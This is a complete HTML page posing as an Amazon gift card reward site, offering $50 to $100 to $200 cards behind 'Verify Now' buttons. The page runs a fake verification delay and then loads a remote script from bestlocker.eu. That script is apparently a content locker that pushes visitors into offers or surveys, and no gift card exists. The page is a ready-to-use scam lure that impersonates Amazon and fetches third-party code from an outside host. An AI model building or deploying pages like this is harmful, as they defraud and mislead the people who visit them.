<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Amazon Gift Card Rewards</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #111;
      overflow-x: hidden;
      height: 100vh;
      color: #fff;
    }

    .container {
      position: relative;
      text-align: center;
      padding: 40px 20px;
      z-index: 2;
    }

    /* Typewriter Headline */
    h1 {
      font-size: 2rem;
      margin-bottom: 30px;
      white-space: nowrap;
      overflow: hidden;
      border-right: 3px solid #ff9900;
      width: 25ch; /* text length */
      color: #fff;
      text-shadow: 0 0 15px #ff9900;
      animation: typing 4s steps(25), blink .75s step-end infinite alternate;
    }
    @keyframes typing {
      from { width: 0 }
    }
    @keyframes blink {
      50% { border-color: transparent }
    }

    /* Card Grid */
    .cards {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 20px;
      margin-top: 30px;
    }

    /* Amazon Gift Card Style */
    .card {
      position: relative;
      padding: 20px;
      border-radius: 20px;
      background: rgba(255,255,255,0.1);
      backdrop-filter: blur(10px);
      border: 2px solid rgba(255,153,0,0.7);
      box-shadow: 0 4px 15px rgba(255,153,0,0.3);
      transition: transform 0.3s;
      cursor: pointer;
    }
    .card:hover { transform: translateY(-5px); }

    .card h2 { font-size: 1.3rem; margin: 10px 0; color: #FF9900; }
    .card p { font-size: 1rem; color: #fff; }

    /* Verify Button */
    .verify-btn {
      display: inline-block;
      margin-top: 15px;
      padding: 12px 20px;
      font-size: 1rem;
      border: none;
      border-radius: 30px;
      background: #FF9900;
      color: #111;
      font-weight: bold;
      cursor: pointer;
      box-shadow: 0 0 15px rgba(255,153,0,0.6);
      transition: all 0.3s;
    }
    .verify-btn:hover { background: #e68a00; }

    /* Loading Spinner */
    .loading {
      border: 3px solid #f3f3f3;
      border-top: 3px solid #FF9900;
      border-radius: 50%;
      width: 20px;
      height: 20px;
      animation: spin 1s linear infinite;
      display: inline-block;
      vertical-align: middle;
      margin-right: 8px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Popup Glassmorphism */
    .popup {
      display: none;
      position: fixed;
      z-index: 9999;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.7);
      backdrop-filter: blur(8px);
    }
    .popup-content {
      background: rgba(255,255,255,0.1);
      backdrop-filter: blur(20px);
      border: 2px solid;
      border-image: linear-gradient(45deg, #ff9900, #ff00ff, #00ffff) 1;
      border-radius: 20px;
      width: 90%;
      max-width: 500px;
      margin: 8% auto;
      padding: 20px;
      position: relative;
      box-shadow: 0 0 25px rgba(255,153,0,0.5);
      color: #fff;
      text-align: center;
    }
    .close-btn {
      position: absolute;
      top: 8px; right: 12px;
      font-size: 28px;
      font-weight: bold;
      color: #fff;
      cursor: pointer;
      text-shadow: 0 0 10px #ff9900;
    }

    /* Glowing Animated Text */
    .glow-text {
      font-size: 1.2rem;
      font-weight: bold;
      background: linear-gradient(90deg, #ff9900, #ff00ff, #00ffff, #ff9900);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-size: 300%;
      animation: glow-move 3s linear infinite;
      text-shadow: 0 0 15px rgba(255,153,0,0.6);
      margin-top: 10px;
    }
    @keyframes glow-move {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    /* Snow / Paper / Fire Particles */
    .particle {
      position: fixed;
      top: -10px;
      width: 8px; height: 8px;
      border-radius: 50%;
      pointer-events: none;
      z-index: 1;
      animation: fall linear infinite;
    }
    @keyframes fall {
      0% { transform: translateY(0) translateX(0) rotate(0deg); opacity: 1; }
      100% { transform: translateY(100vh) translateX(50px) rotate(360deg); opacity: 0; }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>üéÅ Claim Your Amazon Gift Card</h1>
    <div class="cards">
      <div class="card">
        <h2>$50 Amazon Gift Card</h2>
        <p>Unlock this reward instantly</p>
        <button class="verify-btn" onclick="startVerification(this)">Verify Now</button>
      </div>
      <div class="card">
        <h2>$100 Amazon Gift Card</h2>
        <p>Exclusive limited-time reward</p>
        <button class="verify-btn" onclick="startVerification(this)">Verify Now</button>
      </div>
      <div class="card">
        <h2>$200 Amazon Gift Card</h2>
        <p>Premium reward for VIP users</p>
        <button class="verify-btn" onclick="startVerification(this)">Verify Now</button>
      </div>
    </div>
  </div>

  <!-- Popup -->
  <div id="verifyPopup" class="popup">
    <div class="popup-content">
      <span class="close-btn">&times;</span>
      <div id="verify-box"></div>
    </div>
  </div>

  <script>
    // Button Click Loading
    function startVerification(btn) {
      btn.disabled = true;
      let originalText = btn.innerHTML;
      btn.innerHTML = '<span class="loading"></span> Verifying...';

      setTimeout(() => {
        btn.innerHTML = originalText;
        btn.disabled = false;
        openVerifyPopup();
      }, 2000); // 2 sec loading
    }

    // Popup Loading + Locker Delay
    function openVerifyPopup() {
      document.getElementById("verifyPopup").style.display = "block";
      document.getElementById("verify-box").innerHTML = `
        <div class="popup-loading">
          <div class="loading"></div>
          <p class="glow-text">Loading Verification...</p>
        </div>
      `;

      // 3 sec delay before locker load
      setTimeout(() => {
        document.getElementById("verify-box").innerHTML = "";
        var s = document.createElement("script");
        s.type = "text/javascript";
        s.src = "https://bestlocker.eu/iframeLoader/9c03b476-84b9-11f0-948d-8a5fb7be40ea";
        document.getElementById("verify-box").appendChild(s);
      }, 3000);
    }

    // Close Popup
    document.querySelector(".close-btn").onclick = () => {
      document.getElementById("verifyPopup").style.display = "none";
      document.getElementById("verify-box").innerHTML = "";
    };

    // Generate Snow + Paper + Fire Particles
    function createParticle(type) {
      const p = document.createElement("div");
      p.classList.add("particle");

      if (type === "snow") {
        p.style.background = "white";
        p.style.width = p.style.height = Math.random()*5+3 + "px";
        p.style.animationDuration = Math.random()*5+5 + "s";
      } 
      else if (type === "paper") {
        p.style.width = "10px";
        p.style.height = "14px";
        p.style.background = "#f5deb3";
        p.style.animationDuration = Math.random()*6+6 + "s";
      } 
      else if (type === "fire") {
        p.style.background = "orange";
        p.style.width = p.style.height = Math.random()*4+2 + "px";
        p.style.boxShadow = "0 0 10px red";
        p.style.animationDuration = Math.random()*3+3 + "s";
      }

      p.style.left = Math.random()*100 + "vw";
      document.body.appendChild(p);

      setTimeout(()=> p.remove(), 12000);
    }

    setInterval(()=> createParticle("snow"), 500);
    setInterval(()=> createParticle("paper"), 1200);
    setInterval(()=> createParticle("fire"), 800);
  </script>
</body>
</html>
